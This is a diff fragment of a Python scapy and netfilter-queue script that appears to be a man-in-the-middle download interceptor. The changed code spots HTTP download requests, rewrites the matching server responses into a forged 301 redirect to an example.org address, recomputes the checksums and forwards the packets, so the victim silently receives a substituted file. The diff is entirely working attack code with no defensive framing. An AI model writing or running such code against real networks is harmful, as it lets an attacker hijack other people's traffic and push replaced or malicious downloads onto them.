@@ -14,15 +14,20 @@ def process_packet(packet):
                 if format in scapy_packets[scapy.RAW].load:
                     ack_list.append(tcp_packet.ack)
                     print("[+] Download Request:")
-                    print(packet.show())
+
         elif tcp_packet.sport == 80:
             seq = tcp_packet.seq
             if seq in ack_list:
                 ack_list.remove(seq)
                 print("HTTP Response:")
-                print(packet.show())
-
-# packet.accept()
+                scapy_packets[
+                    scapy.RAW].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp"
+                # http 301
+                del scapy_packets[scapy.IP].len
+                del scapy_packets[scapy.IP].chksum
+                del tcp_packet.chksum
+                packet.set_payload(str(scapy_packets))
+    packet.accept()
     """
     packet.accept()  # the packet will be sent to the target
     packet.drop()  #drop the packet at here
